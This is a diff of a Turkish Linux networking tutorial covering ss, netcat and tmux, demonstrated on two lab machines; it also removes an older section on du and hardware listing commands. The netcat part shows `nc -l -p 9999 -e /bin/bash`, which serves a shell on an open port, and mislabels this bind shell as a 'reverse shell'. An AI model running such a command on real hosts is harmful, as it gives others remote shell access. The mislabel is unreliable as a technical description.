+Bakın hedef ip lokal ağımdaki bir host olduğu için router ile yönlendirme ihtiyaç duymadığından default getway adresine uğramadan doğrudan ilgili hedefe yönlendirilmiş gözüküyor. 
+
+Neticede böylelikle routing table kullanım amacını ve önemini bizzat teyit etmiş olduk. 
+
+`traceroute` aracını tıpkı burada olduğu şekilde kullanarak, olası ağ sorunlarını tespit etmemiz de mümkün oluyor. 
+
+# Portlar Hakkında
+
+IP adreslerine ek olarak, sistem üzerindeki tüm araçların sorunsuz şekilde veri alışverişinde bulunabilmesi için portların kullandığını biliyorsunuz. 
+
+![transport-port.webp]({{ site.url }}/egitim/temel-linux/network/transport-port.webp){:class="responsive img-zoomable"}
+
+Dolayısıyla sistemimizdeki portlar hakkında temel düzeyde bilgi almak ve gerektiğinde portları kontrol edebilmek önemli bir yetkinlik. Bu doğrultuda öncelikle sistemimizdeki aktif portları sorgulayarak başlayabiliriz. 
+
+## ss
+
+`ss`, “**s**ocket **s**tatistic” ifadesinin kısaltmasından gelen, Linux sistemindeki soketleri hakkında bilgi sunan bir araçtır. Soketler, işlemler arasındaki haberleşme için kullanılan özel dosyalardır. Aynı cihaz üzerindeki işlemler veya ağ bağlantısı bulunan farklı hostlardaki işlemler arasındaki haberleşmede kullanılıyorlar. Soketler yardımıyla karşılıklı olarak veri iletimi mümkün oluyor.
+
+Öncelikle sistem üzerindeki tüm soket bilgilerin görmek üzere yalnızca `ss` komutunu girebiliriz. 
+
+```bash
+┌──(taylan㉿kali-makinesi)-[~]
+└─$ ss
+Netid             State              Recv-Q             Send-Q                                                Local Address:Port                              Peer Address:Port             Process             
+u_dgr             ESTAB              0                  0                                               /run/systemd/notify 13634                                        * 0                                    
+u_dgr             ESTAB              0                  0                                      /run/systemd/journal/dev-log 13658                                        * 0                                    
+u_dgr             ESTAB              0                  0                                       /run/systemd/journal/socket 13660                                        * 0                                    
+u_str             ESTAB              0                  0                                                /run/user/1000/bus 20625                                        * 19893                                
+u_str             ESTAB              0                  0                                                                 * 19912                                        * 20664                                
+u_str             ESTAB              0                  0                                                                 * 15515                                        * 15516                                
+u_str             ESTAB              0                  0                                              /tmp/dbus-lEUb2kgW9Z 16324                                        * 18943                                
+u_str             ESTAB              0                  0                                                                 * 18039                                        * 18040                                
+u_str             ESTAB              0                  0                                       /run/systemd/journal/stdout 56040                                        * 55074                                
+u_str             ESTAB              0                  0                                       /run/dbus/system_bus_socket 19232                                        * 18410                                
+u_str             ESTAB              0                  0                                       /run/systemd/journal/stdout 17133                                        * 17439                                
+u_str             ESTAB              0                  0                                       /run/systemd/journal/stdout 15456                                        * 14946                                
+u_str             ESTAB              0                  0                                                                 * 19090                                        * 19502                                
+u_str             ESTAB              0                  0                                                @/tmp/.X11-unix/X0 19048                                        * 18176                                
+u_str             ESTAB              0                  0                                                                 * 18985                                        * 18986                                
+u_str             ESTAB              0                  0                                                /run/user/1000/bus 18969                                        * 16327                                
+u_str             ESTAB              0                  0                                              /tmp/dbus-lEUb2kgW9Z 16279                                        * 18825
 ..
 ..
-..
-36      ./.cache/pip/wheels
-100     ./.cache/pip
-436     ./.cache/samba
-4       ./.cache/mesa_shader_cache
-8       ./.cache/sessions/thumbs-kali:0
-20      ./.cache/sessions
-4       ./.cache/obexd
-185048  ./.cache
-4       ./Documents/belgeler
-12      ./Documents
-8       ./Desktop/yeni-dizin
-12      ./Desktop
-175436  ./Downloads
-8       ./calısma
-4       ./ada
-4       ./Pictures/bulbeni
-20      ./Pictures/Yeni Klasor/yeni-isim
-24      ./Pictures/Yeni Klasor
-3020    ./Pictures
-389344  .
+.
 ```
 
-Çıktılar çok uzun olduğu için buraya kısaltarak ekledim fakat alt dizinler de dahil tüm dizinlerdeki klasörlerin bastırıldığı ve en altta toplam disk boyutunun verdiğini görebiliyoruz.
-
-Fark ettiyseniz klasörler içerisinde yer alan dosyaların isimleri bastırılmadı ama tabii ki bu dosyaların boyutları bulundukları klasörler aracılığıyla burada belirtiliyor. Bu sayede çıktılar çok uzamadan mevcut dizin altındaki tüm klasörlerin büyüklüklerini listeleyebiliyoruz.
-
-Yine de ev dizinimde çalıştırdığım için aldığımız bu çıktılar uzun olduğu için size karmaşık gelmiş olabilir. Daha yalın bir çıktılar üzerinden konuşsak daha iyi olacak.
-
-Örneğin ben “***isimler.txt***” dosyasının boyutunu öğrenmek üzere `du isimler.txt` komutunu giriyorum.
+Sistem üzerindeki tüm soketleri kapsadığı için çıktı çok uzun, ben kısaltarak ekledim. Bu çıktılar bizim için çok fazla. Genellikle yalnızca açık olan TCP ve UDP portlarına bakmak için `ss` aracına ihtiyacımız oluyor. Açık portları listelemek için `ss -tuln` komutunu girebiliriz. Buradaki `t` seçeneği **TCP**, `u` seçeneği **UDP**, `l` seçeneği “listening” yani “dinlenen” portları listeler, `n` seçeneği port numaralarını verir.
 
 ```bash
-└─$ du isimler.txt                                               
-8       isimler.txt
+┌──(taylan㉿kali-makinesi)-[~]
+└─$ ss -tuln
+Netid             State              Recv-Q             Send-Q                         Local Address:Port                         Peer Address:Port            Process            
+tcp               LISTEN             0                  128                                  0.0.0.0:22                                0.0.0.0:*                                  
+tcp               LISTEN             0                  128                                     [::]:22                                   [::]:*
 ```
 
-Bakın dosyanın kaç kilobayt disk alanı kapladığı bastırıldı. Dilersek birden fazla dosyanın boyutuna da kolayca bakabiliriz. Hatta `-h` seçeneğini eklersek büyüklüklerin gösterimi bakımından daha okunaklı çıktılar da elde edebiliriz. 
+Şu anda ssh servisi aktif olduğu için 22 portu dinleniyor. Ayrıca yalnızca “dinlenen” portlar yerine tüm port bilgisini almak için `l` seçeneği yerine “**all**” ifadesinden gelen `a` seçeneğini kullanabiliriz. 
 
 ```bash
-└─$ du -h isimler.txt liste1 ~/Downloads/linux.zip 
-8.0K    isimler.txt
-4.0K    liste1
-58M     /home/taylan/Downloads/linux.zip
+┌──(taylan㉿kali-makinesi)-[~]
+└─$ ss -tuna
+Netid             State              Recv-Q             Send-Q                         Local Address:Port                         Peer Address:Port            Process            
+tcp               LISTEN             0                  128                                  0.0.0.0:22                                0.0.0.0:*                                  
+tcp               LISTEN             0                  128                                     [::]:22                                   [::]:*
 ```
 
-Bakın dosyanın tam dizin adresini belirttiğimiz sürece sorunsuzca istediğimiz dosyaların boyutlarını öğrenebiliyoruz. Dosya üzerinde kullanımı gayet basit ve yalın. Birde klasörler üzerinde gözlemleyelim. Ben gözlemleyebilmek için içerisinde web sitesinin dosyalarını ve iç içe klasörler barındıran Downloads dizini atlındaki “linux-dersleri” klasörünün disk üzerinde kapladığı alanı `du -h ~/Downloads/linux-dersleri` komutu ile sorguluyorum.
+Şu anda yalnızca dinlendiği için harici bir port bilgisi bastırılmadı. Ben test etmek için yeni bir konsol açıp, Rocky Linux sistemine ssh ile bağlanacağım. 
 
 ```bash
-└─$ du -h ~/Downloads/linux-dersleri                             
-736K    /home/taylan/Downloads/linux-dersleri/docs/temel-linux
-748K    /home/taylan/Downloads/linux-dersleri/docs
-208K    /home/taylan/Downloads/linux-dersleri/css
-1.3M    /home/taylan/Downloads/linux-dersleri/img/10- Süreç İşlemleri
-3.1M    /home/taylan/Downloads/linux-dersleri/img/1- Komut Satırı
-1.5M    /home/taylan/Downloads/linux-dersleri/img/9- Kullanıcı İşlemleri
-120K    /home/taylan/Downloads/linux-dersleri/img/0- Gerekli Ortamın Kurulması
-764K    /home/taylan/Downloads/linux-dersleri/img/5- Dizin İşlemleri
-420K    /home/taylan/Downloads/linux-dersleri/img/20- Log Dosyaları
-512K    /home/taylan/Downloads/linux-dersleri/img/2- Yardım Alma Komutları
-5.6M    /home/taylan/Downloads/linux-dersleri/img/Linux Nedir
-344K    /home/taylan/Downloads/linux-dersleri/img/12- Çalışma Seviyeleri(Runlevels)
-320K    /home/taylan/Downloads/linux-dersleri/img/15- Joker Karakterler
-1.5M    /home/taylan/Downloads/linux-dersleri/img/11-Disk İşlemleri
-2.5M    /home/taylan/Downloads/linux-dersleri/img/14- Güncelleme Kurma Kaldırma İşlemleri
-1.3M    /home/taylan/Downloads/linux-dersleri/img/3- Bilgi Alma Komutları
-396K    /home/taylan/Downloads/linux-dersleri/img/19- Zamanlanmış Görevler
-1.4M    /home/taylan/Downloads/linux-dersleri/img/18- Konsol Üzerinden Dosya İndirmek
-1.2M    /home/taylan/Downloads/linux-dersleri/img/6- Dosya İşlemleri
-11M     /home/taylan/Downloads/linux-dersleri/img/menu
-2.6M    /home/taylan/Downloads/linux-dersleri/img/17- Vim Editörü
-424K    /home/taylan/Downloads/linux-dersleri/img/7- Dosya Arşivleme
-3.1M    /home/taylan/Downloads/linux-dersleri/img/4 -Linux Dosya Sistemi Hiyerarşisi
-508K    /home/taylan/Downloads/linux-dersleri/img/8- Erişim Yetkileri
-324K    /home/taylan/Downloads/linux-dersleri/img/13- Sembolik Link Ve Katı Link
-21M     /home/taylan/Downloads/linux-dersleri/img/21-Sistem Görünümünü Özelleştirme
-836K    /home/taylan/Downloads/linux-dersleri/img/16- Ağ Komutları
-61M     /home/taylan/Downloads/linux-dersleri/img
-1.1M    /home/taylan/Downloads/linux-dersleri/fonts
-240K    /home/taylan/Downloads/linux-dersleri/js
-63M     /home/taylan/Downloads/linux-dersleri
+┌──(taylan㉿kali-makinesi)-[~]
+└─$ ssh pc@rocky-linux 
+pc@rocky-linux's password: 
+Last login: Sat Aug 26 15:13:21 2023 from 192.168.1.15
+[pc@linuxdersleri ~]$ whoami
+pc
+[pc@linuxdersleri ~]$
 ```
 
-Şimdi çıktılara bakalım. Bakın en altta klasörün içindeki tüm dosya ve klasörlerle birlikte diskte kapladığı toplam disk alanı basılmış. Sonda başa doğru da alt klasörlerin disk üzerindeki boyutları yer alıyor. Her dizin yalnızca kendi içindeki dosya ve klasörlerin toplam boyutunu veriyor, bu şekilde içe içe olan tüm dizinlerin boyut bilgisi sırasıyla bastırılmış oluyor. Neticede gördüğünüz gibi `du` komutu sayesinde bir klasör içinde tüm dizinlerin disk üzerinde toplam kapladıkları alan hakkında kolayca bilgi alabildik. Fakat dikkatinizi çektiyse dosyaların diskte kapladığı alan toplam alana ekleniyor olsa da dosya isimleri yine bastırılmadı. 
-
-Eğer klasörler ile birlikte dosyaların da bastırılmasını istersek `a` seçeneği ile tüm içeriğin bastırılmasını söyleyebiliriz. Ben komutumu çağırıp, `a` seçeneği ekleyip tekrar giriyorum. 
+Şimdi kendi konsolumuza dönüp tekrar `ss -tuna` komutunu girelim.
 
 ```bash
-└─$ du -ha ~/Downloads/linux-dersleri                            
-4.0K    /home/taylan/Downloads/linux-dersleri/menu.html
-4.0K    /home/taylan/Downloads/linux-dersleri/bildirim.html
-20K     /home/taylan/Downloads/linux-dersleri/hakkinda.html
-..
-4.0K    /home/taylan/Downloads/linux-dersleri/js/main.js
-4.0K    /home/taylan/Downloads/linux-dersleri/js/fluidtextresizer.js
-4.0K    /home/taylan/Downloads/linux-dersleri/js/script.js
-240K    /home/taylan/Downloads/linux-dersleri/js
-24K     /home/taylan/Downloads/linux-dersleri/sw_sayfa.js
-44K     /home/taylan/Downloads/linux-dersleri/liste.html
-63M     /home/taylan/Downloads/linux-dersleri
+┌──(taylan㉿kali-makinesi)-[~]
+└─$ ss -tuna
+Netid            State              Recv-Q             Send-Q                         Local Address:Port                          Peer Address:Port            Process            
+tcp              LISTEN             0                  128                                  0.0.0.0:22                                 0.0.0.0:*                                  
+tcp              ESTAB              0                  0                               192.168.1.15:44370                         192.168.1.12:22                                 
+tcp              LISTEN             0                  128                                     [::]:22                                    [::]:*
 ```
 
-Çıtılar uzun olduğu için ben kısaltarak buraya ekledim fakat gördüğünüz gibi `a` seçeneği sayesinde klasörün içindeki tüm dosya ve dizinlerin disk üzerinde kapladıkları alanın bilgisini kolayca bu çıktıdan öğrenebiliyoruz.
+Bakın bu kez “**LISTEN**” durumuna ek olarak “**ESTAB**” yani “**estab**lished” ifadesinden gelen “bağlantı kuruldu” tanımı da görüyoruz. SSH ile hedef sunucuya bağlandığım için aramızda bağlantı kuruldu. Burada hangi port üzerinden hangi ip adresi ile bağlantı kurulduğu da açıkça yazıyor. 
 
-İlgili dizindeki tüm içeriği bastırmak dışında ayrıca dilersek yalnızca belirttiğimiz klasörün boyutunu öğrenmek için “**s**ummarize” yani “özetlemek” ifadesinin kısalmasından gelen `s` seçeneğini de kullanabiliriz. Ben yine “***linux-derlseri***” klasörü üzerinde denemek istiyorum. Bakın yalnızca bu klasörün toplam boyutunu bastırdım.
+İşte `ss` aracının en temel kullanımı bu şekilde. Tabii ki `ss —help` komutu ile bizzat teyit edebileceğiniz gibi esasen çok fazla ek seçenek mevcut fakat temel kullanım için bu kadarlık bilgi bize yeterli olacak.
+
+## netcat | nc
+
+netcat aracı, kısaca `nc` komutu ile kullanılan temel ağ araçlarından biridir. `nc` sayesinde TCP ve UDP üzerinden hedefteki sunucu ile veri alışverişinde bulunarak bağlantı testleri gerçekleştirebiliyoruz. En temel kullanımı, hedef ip ve port sayesinde bağlantı kurulmasıdır. Ben denemek için Kali Linux üzerinde `python3 -m http.server 8080` komutu ile 8080 portunda çalışan bir http server oluşturuyorum.
 
 ```bash
-└─$ du -hs ~/Downloads/linux-dersleri                           
-63M     /home/taylan/Downloads/linux-dersleri
+┌──(taylan㉿kali-makinesi)-[~]
+└─$ python3 -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
 ```
 
-Bunlar dışında eğer istersek spesifik olarak belirttiğimiz birden fazla dosya ve klasörün toplam disk boyutunu da öğrenebiliriz. Normalde örneğin ben ev dizinimde ismi büyük “**D**” ile başlayan tüm içeriklerin `du` aracı ile boyut bilgisini sorgularsam hepsinin ayrı ayrı büyüklükleri bastırılacak. Hemen denemek için özet ve okunaklı çıktı almak üzere `du -sh ~/D*` şeklinde komutumuzu girelim. 
+Şimdi aynı lokal ağdaki Rocky Linux üzerinden bu adrese bağlanmak için hedef sunucu ve ip adresini girmem yeterli.
 
 ```bash
-└─$ du -sh ~/D*                                                  
-12K     /home/taylan/Desktop
-12K     /home/taylan/Documents
-234M    /home/taylan/Downloads
+[root@linuxdersleri ~]# nc 192.168.1.15 8080
+
 ```
 
-Bakın büyük “**D**” karakteri ile başlayan içeriklerin hepsinin ayrı ayrı büyüklükleri konsola bastırıldı. Eğer bu içeriklerin toplam boyutlarının da bastırılmasını istiyorsak komutumuza `c` seçeneğini de ekleyebiliriz. 
+Şu anda Rocky Linux, Kali Linux makinesindeki yani 192.168.1.15 adresindeki 8080 portu üzerinden sunulan http sunucusuna bağlı durumda. Bu durumu teyit etmek için `ss -tuna` komutunu girebiliriz. 
 
 ```bash
-└─$ du -shc ~/D*                                                 
-12K     /home/taylan/Desktop
-12K     /home/taylan/Documents
-234M    /home/taylan/Downloads
-234M    total
+┌──(taylan㉿kali-makinesi)-[~]
+└─$ ss -tuna                                                                                                                                                                      
+Netid            State              Recv-Q             Send-Q                         Local Address:Port                         Peer Address:Port             Process            
+tcp              LISTEN             0                  128                                  0.0.0.0:22                                0.0.0.0:*                                   
+tcp              LISTEN             0                  5                                    0.0.0.0:8080                              0.0.0.0:*                                   
+tcp              ESTAB              0                  0                               192.168.1.15:8080                         192.168.1.12:37440                               
+tcp              LISTEN             0                  128                                     [::]:22                                   [::]:*
 ```
 
-Bakın bu kez en alt satırda, tüm içeriklerin toplam boyutu da özellikle bastırılmış oldu.
+Bağlantı durumu burada ip ve port detaylarıyla birlikte açıkla gözüküyor. 
 
-Neticede farklı örnekler üzerinden de bizzat teyit ettiğimiz gibi dosya ve klasörlerimizin disk üzerinde kapladıkları alan bilgisini öğrenmek için `du` komutunu çok kolay şekilde kullanabiliyoruz. Ayrıca tabii ki ben `du` aracının tüm özelliklerinden yani tüm seçeneklerinden bahsetmedim. Eğer  yardım sayfasına bakacak olursanız daha fazla kullanım seçeneği olduğunu da görebilirsiniz. Ancak benim ele aldıklarım dışındaki diğer seçenekler pek sık tercih edilmediği için ve artık `du` aracının temel çalışma yapısını öğrendiğiniz için ben tüm seçenekleri tek tek açıklama gereği duymuyorum tabii ki. Dilerseniz zaten temelde nasıl çalıştığını bildiğiniz için buradaki ek seçenekleri keşfedebilirsiniz. Sizin de bildiğiniz gibi yardım sayfaları hep bir komut uzağınızda.
-
-Ben son olarak sistemimize bağlı bulunan bazı aygıtları listelememizi sağlayan birkaç bilgi alma komutundan da bahsedip bu bölümü sonlandırmak istiyorum.
-
-## lsusb & lspci & lshw
-
-Sistemimize bağlı bulunan USB aygıtları listelemek istersek, `lsusb` komutun kullanabiliyoruz. Zaten komutun ismi, işlevini gayet iyi biçimde açıklıyor. Hemen `lsusb` şeklinde komutumuzu girelim.
+Ek olarak aramızdaki bağlantı ve veri iletişimini test etmek için burada “hello” yazıp enter ile sunucuya isteğimiz iletelim.
 
 ```bash
-└─$ lsusb
-Bus 001 Device 002: ID 80ee:0021 VirtualBox USB Tablet
-Bus 001 Device 001: ID 1d6b:0001 Linux Foundation 1.1 root hub
+[root@linuxdersleri ~]# nc 192.168.1.15 8080
+hello
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
+        "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+    <head>
+        <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
+        <title>Error response</title>
+    </head>
+    <body>
+        <h1>Error response</h1>
+        <p>Error code: 400</p>
+        <p>Message: Bad request syntax ('hello').</p>
+        <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
+    </body>
+</html>
 ```
 
-Bakın benim sisteminde şu anda bu aygıtlar USB ile bağlı gözüküyor. Ben sanal makine üzerinden çalıştığım için çok aygıt listelenmedi ancak normalde USB ile bağlı olan aygıtlar burada listeleniyor. Örneğin USB üzerinden harici bir wifi kartı taktığınızda aygıt hakkında buradan bilgi alabilirsiniz. USB wifi aygıtınız sistem tarafından tanınmıyorsa, aygıtınızı takıp `lsusb` komutu ile bu liste üzerinden aygıtın buradaki ID sine bakabilirsiniz. Bu id üzerinden internette araştırma yaparak uygun aygıt sürücüsü olup olmadığını sorgulayabilirsiniz. Kullanmakta olduğunu dağıtıma kurmak için forumlarda mutlaka daha önce pek çok kişi soru sorup yanıt almıştır. Eğer sorulmadıysa siz de sorabilirsiniz. Ayrıca github gibi harici kaynaklardan da aygıt sürücülerini araştırabilirsiniz.
-
-Neticede `lsusb` komutu sayesinde gerektiğinde sistemimize bağlı olan USB aygıtları hakkında bilgi almamız mümkün oluyor.
-
-Benzer şekilde **pci veriyolu** üzerinden sistemimize bağlı aygıtları görüntülemek için de `lspci` komutunu kullanabiliyoruz. 
+Hedefteki sunucunun “hello” ifadesine yanıtı, bir hata mesajı oldu. Neticede böylelikle http sunucusu ile iletişim kurabildiğimizi bizzat teyit etmiş olduk. Hatta emin olmak istersek Kali Linux üzerindeki çıktılara da bakabiliriz. 
 
 ```bash
-└─$ lspci
-00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02)
-00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]
-00:01.1 IDE interface: Intel Corporation 82371AB/EB/MB PIIX4 IDE (rev 01)
-00:02.0 VGA compatible controller: VMware SVGA II Adapter
-00:03.0 Ethernet controller: Intel Corporation 82540EM Gigabit Ethernet Controller (rev 02)
-00:04.0 System peripheral: InnoTek Systemberatung GmbH VirtualBox Guest Service
-00:05.0 Multimedia audio controller: Intel Corporation 82801AA AC'97 Audio Controller (rev 01)
-00:06.0 USB controller: Apple Inc. KeyLargo/Intrepid USB
-00:07.0 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 08)
-00:0d.0 SATA controller: Intel Corporation 82801HM/HEM (ICH8M/ICH8M-E) SATA Controller [AHCI mode] (rev 02)
+┌──(taylan㉿kali-makinesi)-[~]
+└─$ python3 -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+192.168.1.12 - - [26/Aug/2023 08:33:41] code 400, message Bad request syntax ('hello')
+192.168.1.12 - - [26/Aug/2023 08:33:41] "hello" 400 -
 ```
 
-Bakın `lsusb` komutuna benzer şekilde bu kez **pci** bağlantısı olan aygıtlar listelenmiş oldu.
+Bakın python ile başlatılan http sunucusunun “hello” mesajına yanıtı, 400 hata kodu olarak gözüküyor. Böylelikle Rocky Linux ile Kali Linux arasında `nc` aracı yardımıyla bağlantı kurulabildiğini tekrar teyit etmiş olduk.
 
-Eğer sisteme bağlı bulunan bütün aygıtları listelemek istersek de `lshw` komutunu kullanabiliyoruz. Buradaki “**hw”** ifadesi “**h**ard**w**are” yani “donanım” ifadesinin kısaltmasından geliyor. Komutumuzu girip sonuçlar üzerine tekrar konuşalım. 
+`nc` aracı genellikle bağlantı kontrolü için kullanılan bir araç fakat benzer yaklaşım kullanılarak alternatif kullanım amaçları da karşılanabiliyor. Örneğin genellikle güvenlik testleri sırasında kullanılan “reverse shell” yaklaşımı için netcat aracı kullanılabiliyor. Bunun için bağlanılmak istenilen hedef sunucuda `nc -l -p 9999 -e /bin/bash` komutu giriliyor. Bu komut `nc` aracının “**9999**” portunu dinlemesini, bağlantı olması halinde ***/bin/bash*** aracını yani bash kabuğunu bu bağlantıdan gelen tarafa sunmasını ifade ediyor. 
 
 ```bash
-└─$ lshw
-bash: /usr/bin/lshw: No such file or directory
+┌──(taylan㉿kali-makinesi)-[~]
+└─$ nc -l -p 9999 -e /bin/bash
 ```
 
-Benim sistemimde bu araç yüklü değişmiş. Kurmak için `sudo apt install lshw -y` komutunu girelim.
+Ben Rocky Linux sisteminden, Kali Linux sistemine reverse shell almak üzere Kali Linux tarafından dinlenmekte olan bu porta, Kali Linux makinesinin ip adresi ile bağlanabilirim.
 
 ```bash
-└─$ sudo apt install lshw
+[pc@linuxdersleri ~]$ nc 192.168.1.15 9999
+whoami
+taylan
+uname -a
+Linux kali-makinesi.linuxdersleri.net 5.15.0-kali3-amd64 #1 SMP Debian 5.15.15-2kali1 (2022-01-31) x86_64 GNU/Linux
+```
+
+Gördüğünüz gibi Rocky Linux sisteminden, Kali Linux sisteminde bir kabuğa erişim sağlamış oldum. Girdiğim komutların çıktılarından, bu bağlantının başarılı olduğunu teyit edebiliyoruz. 
+
+Bu yaklaşım genelde, güvenlik testi sırasında sızılan sisteme dışarıdan erişilebileceğini kanıtlamak üzere kullanılıyor.
+
+Ayrıca `nc` aracı ile hedef ip adresindeki portları taramamız ya da dosya gönderme gibi işlemler yapmamız da mümkün. Aracın temelde nasıl çalıştığını öğrendiğinize göre kısa bir araştırma ile bu işlemleri nasıl gerçekleştirebileceğinizi de öğrenebilirsiniz. 
+
+# iptables | firewalld Hakkında
+
+IP ve portlar için kural tanımlamamıza olanak sağlayan **iptables** ve **firewalld** yapıları mevcuttur. Her ne kadar biz bu eğitimde değinmeyecek olsak da, sistem yönetimi alanında ilerlemek isteyenler için bu yapıların varlığından haberdar olup araştırabilmeleri adına burada bu açıklamayı eklemek istedim.
+
+Sisteme gelen ve sistemden çıkan tüm paketlerin istenilen koşullara göre filtrelenebilmesi için iptables ve firewalld çözümleri kullanılabiliyor. Dolayısıyla sistem güvenliği konusunda ek araştırma yapmak istiyorsanız bu kavramları araştırarak başlayabilirsiniz. 
+
+Tıpkı iptables ve firewalld gibi elbette bu bölüm içerisinde değinmediğimiz pek çok farklı ağ aracı bulunmasına karşın, temel düzeyde ağ ile ilgili işlerimizi halletmek için yeteri kadar araçtan bahsetmiş olduk. Bizim değinmediğimiz diğer araçlar ve detaylar, ağ üzerinde gerçekleştirmek istediğiniz işlemler özelinde kullanmanız gereken spesifik çözümlerdir. Bu eğitim herkese yönelik temel Linux eğitimi sunmayı amaçladığı için profesyonel Linux sistem yönetimi detay seviyesinde bilgilere değinmedik. Ama bahsetmiş olduğumuz temel bilgiler, hangi yöne doğru gitmek isterseniz kullanabileceğiniz temellerdir. Örneğin ileride sistem yöneticiliği özelinde bir eğitim serisi hazırlayacak olursam, buradaki temelleri bildiğinizi varsayarak bu temeller üzerinden yeni detaylara değiniyor olurum. Dolayısıyla gereken temele sahip olduğunuz için bundan sonrası ihtiyaçlarına göre kendi araştırmanıza kalıyor. 
+
+# tmux
+
+`tmux` aracı konsol üzerindeki verimliliğimizi artıran bir araç. Doğrudan ağ ile ilgili olmasa da eğitimin sonunda değinmenin daha doğru olacağını düşündüğüm için bu bölümde ele alıyorum.
+
+`tmux` sayesinde tek bir konsol oturumunu birden fazla parçaya bölüp kullanabiliyoruz. Bu araç varsayılan olarak yüklü gelmediği için `sudo apt install tmux` ya da `sudo dnf install tmux` komutu ile kurabilirsiniz.
+
+```bash
+┌──(taylan㉿linuxdersleri)-[~]
+└─$ sudo apt install tmux
 Reading package lists... Done
 Building dependency tree... Done
 Reading state information... Done
 The following NEW packages will be installed:
-  lshw
-0 upgraded, 1 newly installed, 0 to remove and 1829 not upgraded.
-Need to get 300 kB of archives.
-After this operation, 941 kB of additional disk space will be used.
-Get:1 http://http.kali.org/kali kali-rolling/main amd64 lshw amd64 02.19.git.2021.06.19.996aaad9c7-2+b1 [300 kB]
-Fetched 300 kB in 11s (26.7 kB/s)
-Selecting previously unselected package lshw.
-(Reading database ... 291347 files and directories currently installed.)
-Preparing to unpack .../lshw_02.19.git.2021.06.19.996aaad9c7-2+b1_amd64.deb ...
-Unpacking lshw (02.19.git.2021.06.19.996aaad9c7-2+b1) ...
-Setting up lshw (02.19.git.2021.06.19.996aaad9c7-2+b1) ...
-Processing triggers for kali-menu (2021.4.2) ...
+  tmux
+0 upgraded, 1 newly installed, 0 to remove and 1827 not upgraded.
+Need to get 455 kB of archives.
+After this operation, 1,137 kB of additional disk space will be used.
+Get:1 http://kali.download/kali kali-rolling/main amd64 tmux amd64 3.3a-4 [455 kB]
+Fetched 455 kB in 14s (32.1 kB/s)
+Selecting previously unselected package tmux.
+(Reading database ... 291994 files and directories currently installed.)
+Preparing to unpack .../archives/tmux_3.3a-4_amd64.deb ...
+Unpacking tmux (3.3a-4) ...
+Setting up tmux (3.3a-4) ...
 Processing triggers for man-db (2.9.4-4) ...
+Processing triggers for kali-menu (2021.4.2) ...
 ```
 
-Tamamdır aracım kuruldu. Şimdi tekrar `lshw` komutu ile tüm donanımları listelemeyi deneyelim.
+Aracımız kurulduktan sonra `tmux` komutu ile başlatabiliyoruz.
 
-```bash
-└─$ lshw
-WARNING: you should run this program as super-user.
-kali                        
-    description: Computer
-    width: 64 bits
-    capabilities: smp vsyscall32
-  *-core
-       description: Motherboard
-       physical id: 0
-     *-memory
-          description: System memory
-          physical id: 0
-          size: 10GiB
-     *-cpu
-          product: Intel(R) Core(TM) i7-6700 CPU @ 3.40GHz
-          vendor: Intel Corp.
-          physical id: 1
-          bus info: cpu@0
-          version: 6.94.3
-          width: 64 bits
-          capabilities: fpu fpu_exception wp vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ht syscall nx rdtscp x86-64 constant_tsc rep_good nopl xtopology nonstop_tsc cpuid tsc_known_freq pni pclmulqdq ssse3 cx16 pcid sse4_1 sse4_2 movbe popcnt aes rdrand hypervisor lahf_lm abm 3dnowprefetch invpcid_single pti fsgsbase bmi1 bmi2 invpcid rdseed clflushopt md_clear flush_l1d arch_capabilities
-          configuration: microcode=4294967295
-     *-pci
-          description: Host bridge
-          product: 440FX - 82441FX PMC [Natoma]
-          vendor: Intel Corporation
-          physical id: 100
-          bus info: pci@0000:00:00.0
-          version: 02
-          width: 32 bits
-          clock: 33MHz
-        *-usb
-             description: USB controller
-             product: KeyLargo/Intrepid USB
-             vendor: Apple Inc.
-             physical id: 6
-             bus info: pci@0000:00:06.0
-             version: 00
-             width: 32 bits
-             clock: 33MHz
-             capabilities: ohci bus_master cap_list
-             configuration: driver=ohci-pci latency=64
-             resources: irq:22 memory:f0804000-f0804fff
-        *-bridge
-             description: Bridge
-             product: 82371AB/EB/MB PIIX4 ACPI
-             vendor: Intel Corporation
-             physical id: 7
-             bus info: pci@0000:00:07.0
-             version: 08
-             width: 32 bits
-             clock: 33MHz
-             capabilities: bridge
-             configuration: driver=piix4_smbus latency=0
-             resources: irq:9
-  *-input:0
-       product: AT Translated Set 2 keyboard
-       physical id: 1
-       logical name: input0
-       logical name: /dev/input/event0
-       logical name: input0::capslock
-       logical name: input0::numlock
-       logical name: input0::scrolllock
-       capabilities: i8042
-WARNING: output may be incomplete or inaccurate, you should run this program as super-user.
-```
+![tmux.webp]({{ site.url }}/egitim/temel-linux/network/tmux.webp){:class="responsive img-zoomable"}
 
-Çıktıları kısaltarak vermiş olmama karşın farlı kategoriler altında bilgisayara bağlı bulunan aygıtların listelendiğini görebiliyoruz. 
+`tmux` komutunu girdikten sonra, **tmux** oturumunda bash kabuğu çalıştırılıyor. Bu araç üzerinden komutlarımızı girebiliyoruz. Dilersek dikey ve yatay olarak yeni konsol oturumları eklememiz mümkün. `tmux` kısayollarını kullanabilmek için öncelikle <kbd>Ctrl</kbd> + <kbd>B</kbd> tuşuna basıyoruz. Daha sonra dikey olarak yeni konsol ekleyeceksek yüzde işareti <kbd>%</kbd> tuşuna basıyoruz.
 
-Ayrıca benim kısaltmış olmam dışında eğer sizin aldığınız çıktılarda aygıtlar eksikse, aracınızı `sudo lshw` komutuyla yetkili şekilde çalıştırmayı deneyebilirsiniz. Tabii ki bu bilgiler sürekli olarak ihtiyacımız olacak türden bilgiler de değil. Yalnızca aygıtınızla ilgili sorun çözmeniz gerektiğinde size bilgi vermesi için veya belki forumlarda destek isterken kullanabileceğiniz basit işlevsel bir araç yalnızca. 
